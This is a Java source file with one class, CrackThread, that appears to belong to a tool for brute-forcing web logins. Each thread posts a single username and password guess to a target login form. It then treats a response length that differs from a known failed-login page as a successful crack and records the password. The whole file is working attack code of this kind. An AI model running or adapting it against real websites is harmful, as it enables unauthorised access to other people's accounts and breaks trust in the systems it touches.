package com.form;

import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Scanner;

public class CrackThread implements Runnable {
	String nameOfName;
	String name;
	String nameOfPass;
	String pass;
	int lengthOfWebpage1=0;
	int lengthOfWebpage2=0;
	int wrongLen;
	boolean flag=false;
	String urlString;
	Crack crack;
	public CrackThread(Crack crack,String nameOfName, String name, String nameOfPass,
			String pass,int wrongLen,String url) {
		// TODO Auto-generated constructor stub
		this.nameOfName = nameOfName;
		this.name = name;
		this.nameOfPass = nameOfPass;
		this.pass = pass;
		this.wrongLen=wrongLen;
		this.urlString=url;
		this.crack=crack;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		try {
			doPost();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		crack.active--;
	}

	public boolean doPost()
			throws IOException {
		URL url = new URL(urlString);
		URLConnection connection = url.openConnection();
		connection.setDoOutput(true);

		PrintWriter out = new PrintWriter(connection.getOutputStream());

		out.print(nameOfName);
		out.print('=');
		out.print(URLEncoder.encode(name, "UTF-8"));
		out.print('&');
		out.print(nameOfPass);
		out.print('=');
		out.print(URLEncoder.encode(pass, "UTF-8"));
		out.close();

		Scanner in;
		StringBuilder response = new StringBuilder();

		try {
			in = new Scanner(connection.getInputStream());
		} catch (IOException e) {
			if (!(connection instanceof HttpURLConnection))
				throw e;
			InputStream err = ((HttpURLConnection) connection).getErrorStream();
			if (err == null)
				throw e;
			in = new Scanner(err);
		}

		while (in.hasNextLine()) {
			response.append(in.nextLine());
			response.append("\n");
		}
		in.close();
		crack.form.resultPass.setText(pass);

		if(Math.abs(wrongLen-response.length())>6){
			crack.pass=pass;
			crack.isSucceed=true;
			return true;
		}
		return false;
	}

}
